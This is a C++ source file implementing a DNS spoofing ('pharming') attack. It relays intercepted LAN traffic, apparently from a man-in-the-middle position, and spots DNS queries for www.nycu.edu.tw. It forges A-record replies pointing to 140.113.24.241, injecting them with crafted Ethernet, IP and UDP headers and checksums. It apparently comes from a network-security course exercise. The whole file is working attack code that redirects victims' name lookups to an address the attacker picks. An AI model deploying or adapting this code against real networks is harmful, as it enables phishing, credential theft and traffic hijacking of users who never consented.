#include "../header/pharmAttack.h"
#include <netinet/udp.h>
#include <tuple>

uint16_t calculateChecksum(uint16_t *ptr, int nbytes, uint32_t init) {
    uint32_t sum = init;
    uint16_t answer = 0;
    uint16_t *w = ptr;
    int nleft = nbytes;

    // Sum up 16-bit words
    while (nleft > 1) {
        sum += *w++;
        nleft -= 2;
    }

    // Add left-over byte, if any
    if (nleft == 1) {
        *(unsigned char *)(&answer) = *(unsigned char *)w;
        sum += answer;
    }

    // Fold 32-bit sum to 16 bits
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    answer = ~sum;

    return answer;
}

uint16_t caculateUDPchecksum(uint16_t *ptr, uint32_t src, uint32_t dst, uint16_t udpSize)
{
    uint32_t sum = 0;
    uint16_t answer = 0;

    pseudo_header ph{};
    ph.source_address = src;
    ph.dest_address = dst;
    ph.protocol = IPPROTO_UDP; 
    ph.udp_length = htons(udpSize);
    uint16_t* ptrPh = reinterpret_cast<uint16_t*>(&ph);

    for(int i = 0; i < 12; i+=2)
    {
        sum += *ptrPh;
        ptrPh++;
    }

    answer = calculateChecksum(ptr, udpSize, sum);
    return answer;

}

bool pharmAttack::checkIsDNS(const uint8_t* buffer, int bufferSize)
{
    uint8_t* start = const_cast<uint8_t*>(buffer);
    size_t ethHdrSize = sizeof(ethhdr);
    if((size_t)bufferSize < ethHdrSize)
    {
        return false;
    }
    iphdr* ipHeader = reinterpret_cast<iphdr*>(start + ethHdrSize);
    uint8_t protocol = ipHeader->protocol;
    if(protocol != IPPROTO_UDP)
    {
        return false;
    }
    size_t ipHdrSize = ipHeader->ihl * 4;
    if((size_t)bufferSize < ethHdrSize + ipHdrSize)
    {
        return false;
    }
    udphdr* udpHeader = reinterpret_cast<udphdr*>(start + ethHdrSize + ipHdrSize); 
    uint16_t port = ntohs(udpHeader->dest);
    return (port == 53);
}

DNSquestionInfo pharmAttack::extractQuestionInfo(const uint8_t* buffer, int bufferSize)
{
    uint8_t* start = const_cast<uint8_t*>(buffer);
    ethhdr* ethHeader = reinterpret_cast<ethhdr*>(start);
    size_t ethHdrSize = sizeof(ethhdr);
    iphdr* ipHeader = reinterpret_cast<iphdr*>(start + ethHdrSize);
    size_t ipHdrSize = ipHeader->ihl * 4;
    udphdr* udpHeader = reinterpret_cast<udphdr*>(start + ethHdrSize + ipHdrSize);
    size_t udpHdrSize = sizeof(udphdr);
    uint8_t* DNSpacket = (start + ethHdrSize + ipHdrSize + udpHdrSize);
    size_t DNSpacketSize = bufferSize - ethHdrSize - ipHdrSize - udpHdrSize;
    DNSHeader* DNSheader = reinterpret_cast<DNSHeader*>(DNSpacket);

    DNSquestionInfo info{};
    std::copy(ethHeader->h_dest, ethHeader->h_dest + 6, info.dstMAC.data());
    std::copy(ethHeader->h_source, ethHeader->h_source + 6, info.srcMAC.data());
    info.dstIP = ipHeader->daddr;
    info.srcIP = ipHeader->saddr;
    info.dstPort = udpHeader->dest;
    info.srcPort = udpHeader->source;
    info.DNSid = ntohs(DNSheader->id);
    int flags = ntohs(DNSheader->flags);
    info.flags.qr = (flags>>15)&1;
    info.flags.opcode = (flags>>11)&0xf;
    info.flags.aa = (flags>>10)&1;
    info.flags.tc = (flags>>9)&1;
    info.flags.rd = (flags>>8)&1;
    info.flags.ra = (flags>>7)&1;
    info.flags.z = (flags>>4)&0x7;
    info.flags.rcode = flags&0xf;

    info.specifiedURLoffset = checkIsDNSRequestToSpecificURL(DNSpacket, DNSpacketSize, "www.nycu.edu.tw");
    info.hasSpecifiedURL = (info.specifiedURLoffset != 0);
    if(!info.hasSpecifiedURL)
    {
        return info;
    }
    size_t DNSquestionSize;
    std::tie(std::ignore, DNSquestionSize) = getDNSquestionSection(DNSpacket, DNSpacketSize);
    info.questionSectionSize = DNSquestionSize;
    return info;
}

std::tuple<uint8_t*, std::string, uint16_t, uint16_t, size_t> getNextDNSquestion(uint8_t* start, int limit)
{
    int nextSegBytes = 0;
    std::string domainName;
    for(int i = 0; i < limit - 4; i++)
    {
        if(start[i] == 0)
        {
            uint16_t type = start[i+1] << 8 | start[i+2];
            uint16_t class_ = start[i+3] << 8 | start[i+4];
            type = ntohs(type);
            class_ = ntohs(class_);
            uint8_t* next = start + i + 5;
            return std::make_tuple(next, domainName, type, class_, i + 5);
        }
        else if(nextSegBytes == 0)
        {
            nextSegBytes = start[i];
            if(domainName != "")
            {
                domainName += ".";
            }
        }
        else
        {
            domainName += start[i];
            nextSegBytes--;
        }
    }
    return std::make_tuple(nullptr, "", 0, 0, 0);
}

std::pair<uint8_t*, int> pharmAttack::getDNSpacket(const uint8_t* buffer, int bufferSize)
{
    uint8_t* start = const_cast<uint8_t*>(buffer);
    size_t ethHdrSize = sizeof(ethhdr);
    iphdr* ipHeader = reinterpret_cast<iphdr*>(start + ethHdrSize);
    size_t ipHdrSize = ipHeader->ihl * 4;
    size_t udpHdrSize = sizeof(udphdr);
    uint8_t* DNSheader = start + ethHdrSize + ipHdrSize + udpHdrSize;
    size_t DNSSize = bufferSize - ethHdrSize - ipHdrSize - udpHdrSize;
    return std::make_pair(DNSheader, DNSSize);
}

std::pair<uint8_t*, int> pharmAttack::getDNSquestionSection(const uint8_t* DNSbuffer, int DNSsize)
{
    DNSHeader* DNSheader = reinterpret_cast<DNSHeader*>(const_cast<uint8_t*>(DNSbuffer));
    size_t DNSheaderSize = sizeof(DNSHeader);
    int questionCount = ntohs(DNSheader->questionCount);
    if(questionCount == 0)
    {
        return std::make_pair(nullptr, 0);
    }
    uint8_t* DNSquestion = const_cast<uint8_t*>(DNSbuffer) + DNSheaderSize;
    uint8_t* nextDNSquestion = DNSquestion;
    size_t remainingSize = DNSsize - DNSheaderSize;
    size_t allQuestionSize = 0;
    for(int i = 0; i < questionCount; i++)
    {
        size_t questionSize;
        std::tie(nextDNSquestion, std::ignore, std::ignore, std::ignore, questionSize) = getNextDNSquestion(nextDNSquestion, remainingSize);
        remainingSize -= questionSize;
        allQuestionSize += questionSize;
        if(nextDNSquestion == nullptr || remainingSize <= 0)
        {
            break;
        }
    }
    return std::make_pair(DNSquestion, allQuestionSize);
}

size_t pharmAttack::checkIsDNSRequestToSpecificURL(const uint8_t* DNSbuffer, int DNSsize, const std::string& url)
{
    uint8_t* start = const_cast<uint8_t*>(DNSbuffer);
    DNSHeader* DNSheader = reinterpret_cast<DNSHeader*>(start);
    size_t DNSheaderSize = sizeof(DNSHeader);
    if((size_t)DNSsize < DNSheaderSize)
    {
        //std::cerr << "[INFO] Size failed: checkIsDNSRequestToSpecificURL: DNSsize " << DNSsize << std::endl;
        return false;
    }
    if(ntohs(DNSheader->questionCount) == 0)
    {
        return false;
    }
    
    uint8_t* DNSquestion = start + DNSheaderSize;
    int offset = DNSheaderSize;
    size_t DNSpayloadSize = DNSsize - DNSheaderSize;
    int questionCount = ntohs(DNSheader->questionCount);
    uint8_t* nextDNSquestion = DNSquestion;
    size_t remainingSize = DNSpayloadSize;
    for(int i = 0; i < questionCount; i++)
    {
        std::string domainName;
        uint16_t type, class_;
        size_t questionSize;
        std::tie(nextDNSquestion, domainName, type, class_, questionSize) = getNextDNSquestion(nextDNSquestion, remainingSize);
        remainingSize -= questionSize;
        type = ntohs(type);
        class_ = ntohs(class_);
        if(domainName == url && type == 1 && class_ == 1) // A record and IN class
        {
            return offset;
        }
        if(domainName == "" || nextDNSquestion == nullptr || remainingSize <= 0)
        {
            return false;
        }
        offset += questionSize;
    }
    return false;

}

std::vector<uint8_t> pharmAttack::generateDNSresponse(const uint8_t* DNSbuffer, int DNSsize, DNSquestionInfo info, uint32_t fakeIp)
{
    size_t DNSHeaderSize = sizeof(DNSHeader);
    size_t DNSanswerSize = 2 + 2 + 2 + 4 + 2 + 4; // name, type, class, ttl, rdlength, rdata ( = 4 for A record)
    std::vector<uint8_t> response(DNSsize + DNSanswerSize); 
    std::copy(DNSbuffer, DNSbuffer + DNSHeaderSize + info.questionSectionSize, response.data()); // copied Header and queries from DNS query
    uint8_t* DNSTrailer = const_cast<uint8_t*>(DNSbuffer) + DNSHeaderSize + info.questionSectionSize;
    size_t DNSTrailerSize = DNSsize - DNSHeaderSize - info.questionSectionSize;
    DNSHeader* DNSheader = reinterpret_cast<DNSHeader*>(response.data());
    DNSFlags respondflags = info.flags;
    respondflags.qr = 1;
    respondflags.opcode = 0;
    respondflags.aa = 0;
    respondflags.tc = 0;
    respondflags.rd = info.flags.rd;
    respondflags.ra = 1;
    respondflags.z = 0;
    respondflags.rcode = 0;
    DNSheader->flags = htons((respondflags.qr<<15) | 
                (respondflags.opcode<<11) | 
                (respondflags.aa<<10) | (respondflags.tc<<9) | 
                (respondflags.rd<<8) | (respondflags.ra<<7) | 
                (respondflags.z<<4) | respondflags.rcode);
    
    DNSheader->ansCount = htons(1); // all other is copied from DNS query

    uint8_t* DNSanswer = response.data() + DNSHeaderSize + info.questionSectionSize;
    *DNSanswer = 0xc0;
    *(DNSanswer + 1) = info.specifiedURLoffset;
    *(reinterpret_cast<uint16_t*>(DNSanswer + 2)) = htons(1); // A record
    *(reinterpret_cast<uint16_t*>(DNSanswer + 4)) = htons(1); // IN class
    *(reinterpret_cast<uint32_t*>(DNSanswer + 6)) = htonl(1800); // TTL, 1800 seconds
    *(reinterpret_cast<uint16_t*>(DNSanswer + 10)) = htons(4); // rdata length
    *(reinterpret_cast<uint32_t*>(DNSanswer + 12)) = fakeIp; // fake IP
    std::copy(DNSTrailer, DNSTrailer + DNSTrailerSize , DNSanswer + DNSanswerSize);
    return response;
}

void pharmAttack::encapsulate(std::vector<uint8_t> payload, DNSquestionInfo info)
{
    uint8_t buffer[65536];
    memset(buffer, 0, sizeof(buffer));
    size_t packetSize = 0;
    ethhdr* ethHeader = reinterpret_cast<ethhdr*>(buffer);
    iphdr* ipHeader = reinterpret_cast<iphdr*>(buffer + sizeof(ethhdr));
    udphdr* udpHeader = reinterpret_cast<udphdr*>(buffer + sizeof(ethhdr) + sizeof(iphdr));
    uint8_t* DNSPacketStart = (buffer + sizeof(ethhdr) + sizeof(iphdr) + sizeof(udphdr));
    packetSize = sizeof(ethhdr) + sizeof(iphdr) + sizeof(udphdr) + payload.size();
    ethHeader->h_proto = htons(ETH_P_IP);
    std::copy(info.dstMAC.begin(), info.dstMAC.end(), ethHeader->h_source);
    std::copy(info.srcMAC.begin(), info.srcMAC.end(), ethHeader->h_dest);
    ipHeader->version = 4;
    ipHeader->ihl = 5;
    ipHeader->ttl = 64;
    ipHeader->id = htons(21354); // random number is okay, I guess...
    ipHeader->protocol = IPPROTO_UDP;
    ipHeader->tot_len = htons(packetSize - sizeof(ethhdr));
    ipHeader->frag_off = htons((2<<13) + 0); // don't fragment
    ipHeader->saddr = info.dstIP;
    ipHeader->daddr = info.srcIP;

    udpHeader->source = info.dstPort;
    udpHeader->dest = info.srcPort;
    udpHeader->len = htons(payload.size() + sizeof(udphdr));
    
    std::copy(payload.begin(), payload.end(), DNSPacketStart);

    udpHeader->check = 0;
    uint16_t udpChecksum = caculateUDPchecksum(reinterpret_cast<uint16_t*>(udpHeader), info.dstIP, info.srcIP, payload.size() + sizeof(udphdr));
    udpHeader->check = udpChecksum;

    ipHeader->check = 0;
    uint16_t ipChecksum = calculateChecksum(reinterpret_cast<uint16_t*>(ipHeader), sizeof(iphdr), 0);
    ipHeader->check = ipChecksum;

    ip.sendPacket(buffer, packetSize, info.srcMAC);
}

void pharmAttack::processPackets(const char* interface) {

    uint32_t gatewayIp = util::getDefaultGateway(interface);
    std::array<uint8_t, 6> gatewayMac;
    if(IPToMac.find(gatewayIp) == IPToMac.end()) {
        util::errquit("processPackets: gateway not found");
    }
    gatewayMac = IPToMac[gatewayIp];
    
    uint8_t buffer[65536];
    size_t bufferSize = sizeof(buffer);

    uint32_t fakeIp = util::stringToIp("140.113.24.241");

    while(true) 
    {
        int recvSize = ip.receivePacketToMe(buffer, bufferSize);
        // ethhdr* ethHeader = reinterpret_cast<ethhdr*>(buffer);
        iphdr* ipHeader = reinterpret_cast<iphdr*>(buffer + sizeof(ethhdr));
        uint32_t destIp = ipHeader->daddr;
        if(ip.checkNeedRedirect(ipHeader))
        {
            // std::cerr << "[INFO] processPackets: received packet from " << util::ipToString(ipHeader->saddr) << " to " << util::ipToString(ipHeader->daddr) << std::endl;
            // std::cerr << "[INFO] processPackets: redirecting packet to " << util::ipToString(destIp) << std::endl;
            std::array<uint8_t, 6> trueDestMac;
            if (IPToMac.find(destIp) == IPToMac.end()) {
                trueDestMac = gatewayMac;
            }
            else
            {
                trueDestMac = IPToMac[destIp];
            }
            
            if(checkIsDNS(buffer, recvSize))
            {
                //std::cerr << "[INFO] processPackets: DNS packet found" << std::endl;
                //std::cerr << "[INFO] processPackets: DNS packet size " << recvSize << std::endl;
                uint8_t* DNSbuffer;
                int DNSsize;
                std::tie(DNSbuffer, DNSsize) = getDNSpacket(buffer, recvSize);
                std::string url = "www.nycu.edu.tw";
                DNSquestionInfo resinfo = extractQuestionInfo(buffer, recvSize);
                if(resinfo.hasSpecifiedURL)
                {
                    std::cerr << "[INFO] processPackets: DNS request to www.nycu.edu.tw found" << std::endl;
                    // std::cerr << "[INFO] processPackets: DNS question size " << resinfo.questionSectionSize << std::endl;
                    // std::cerr << "[INFO] processPackets: DNS question offset " << resinfo.specifiedURLoffset << std::endl;
                    std::vector<uint8_t> res = generateDNSresponse(DNSbuffer, DNSsize, resinfo, fakeIp);
                    encapsulate(res, resinfo);
                }
                else
                {
                    ip.redirectPacket(buffer, trueDestMac);
                }
                // std::string payload = getHTTPpayload(buffer, recvSize);
                // extractHTTPpayload(payload);
            }
            else
            {
                ip.redirectPacket(buffer, trueDestMac);
            }

        }
    }
}
